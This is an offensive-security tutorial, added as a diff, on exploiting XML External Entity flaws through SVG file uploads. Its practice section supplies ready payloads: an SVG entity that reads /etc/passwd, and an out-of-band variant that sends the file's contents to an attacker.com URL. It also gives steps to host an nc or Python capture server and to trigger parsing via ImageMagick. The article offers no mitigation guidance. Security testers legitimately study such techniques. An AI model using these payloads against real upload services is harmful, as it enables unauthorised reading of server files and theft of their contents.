@@ -1,0 +1,122 @@
+---
+title: Exploiting XXE Vulnerabilities in SVG Files
+description: Learn how to exploit XML External Entity (XXE) vulnerabilities in SVG
+  files for data disclosure and OOB exfiltration.
+keywords:
+- XXE vulnerability
+- SVG attack
+- data exfiltration
+- XML parsing
+- security
+- cybersecurity
+- OOB exfiltration
+- information disclosure
+- XXE in SVG
+---
+
+# XXE Inside SVG
+
+## Context
+
+The objective of this article is to demonstrate the exploitation of XML External Entity (XXE) vulnerabilities using SVG files. This technique can achieve sensitive data disclosure or out-of-band (OOB) data exfiltration. It is assumed that the reader understands XML structure and parsing, the SVG file format and embedding, entity declaration and referencing in XML, and general XXE attack principles.
+
+## Theory
+
+### SVG as an XML Attack Surface
+
+SVG (Scalable Vector Graphics) is a versatile, XML-based image format widely used for defining vector-based graphics on the web. Unlike raster graphics, SVG images are defined in plaintext, allowing them to include XML entities and external references. This capability makes SVG files a potential vector for XML External Entity (XXE) payloads. 
+
+Applications that process SVG files without adequately disabling external entity resolution can be susceptible to XXE attacks, presenting an increased attack surface when SVG files are wrongly trusted and processed server-side.
+
+### SVG Text Injection and Rasterization XXE
+
+By injecting malicious XML DOCTYPE declarations and entities into SVG files, attackers can manipulate how image processing libraries handle these files. Attacks occur when these images are parsed without disabling entity resolution, exploiting the fact that libraries like ImageMagick or librsvg frequently process such images.
+
+The attack sequence involves crafting an SVG file containing a DOCTYPE definition with an external entity that references local system files. When parsed, the system attempts to resolve these entities, potentially exposing or leaking sensitive data.
+
+### Out-of-Band (OOB) Data Exfiltration via SVG
+
+An advanced XXE attack may facilitate Out-of-Band (OOB) data exfiltration. This technique involves crafting SVG files that, when parsed, issue OOB network requests to attacker-controlled servers, leaking sensitive files or data.
+
+In this attack sequence, a malicious SVG defines an external entity referring to a sensitive file, such as `/etc/passwd`. This entity is then embedded into an OOB payload within the SVG, which, when processed, results in the sensitive data being sent to an external server controlled by the attacker.
+
+### Processing Contexts and Threat Surface
+
+The SVG file format's flexibility can be exploited when applications trust uploaded files for purposes like avatars, document previews, or image conversions. SVG files might be parsed server-side in various contexts, revealing the application's XML parser to manipulation. Misconfigured parsing or error-prone trust assumptions amplify the vulnerability, requiring attackers to explore every entry point that could pass SVG data to a web application's backend.
+
+## Practice
+
+### Embedding a Basic XXE Payload in SVG
+
+To execute a simple XXE attack using SVG files:
+
+- **Craft the malicious SVG:**
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text y="20">&xxe;</text>
+</svg>
+```
+
+This SVG contains a DOCTYPE with an external entity `xxe` that tries to access the file `/etc/passwd`.
+
+- **Upload the SVG:**
+
+  * Submit this SVG to a web application that accepts SVG files as uploads, such as for avatars or content creation.
+
+- **Trigger SVG rendering:**
+
+  * Render the uploaded SVG within the application to trigger XML parsing engine to process the SVG, checking for any disclosure or leakage of local file contents.
+
+### OOB XXE Data Exfiltration via SVG
+
+For OOB exfiltration attacks:
+
+- **Craft the SVG for exfiltration:**
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 '<!ENTITY exfil SYSTEM "http://attacker.com/?data=%data;">'>
+%param1;]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text y="20">&exfil;</text>
+</svg>
+```
+
+This SVG uses an OOB exfiltration technique by sending data to an external HTTP server under the attacker's control.
+
+- **Host a capture server:**
+
+  * Set up a server (e.g., using `nc` or Python's `http.server`) to listen for incoming requests from the SVG payload.
+
+- **Upload and parse:**
+
+  * Upload this SVG to initiate server-side parsing, which may result in file contents being exfiltrated to the control server.
+
+### Testing SVG XXE with Image Processing Libraries
+
+Testing XXE vulnerabilities in image processing libraries:
+
+- **Process SVG with ImageMagick:**
+
+    ```bash
+    convert malicious.svg output.png
+    ```
+  
+  * This command using ImageMagick processes the SVG file, potentially triggering the XXE vulnerability.
+
+- **Monitor for unauthorized activities:**
+
+  * Check for file system access or unsolicited network requests as indicators of a successful XXE attack via image conversion tools.
+
+## Tools
+
+- **Burp Suite**
+- **ImageMagick**
+- **nc**
+- **Python HTTP server**
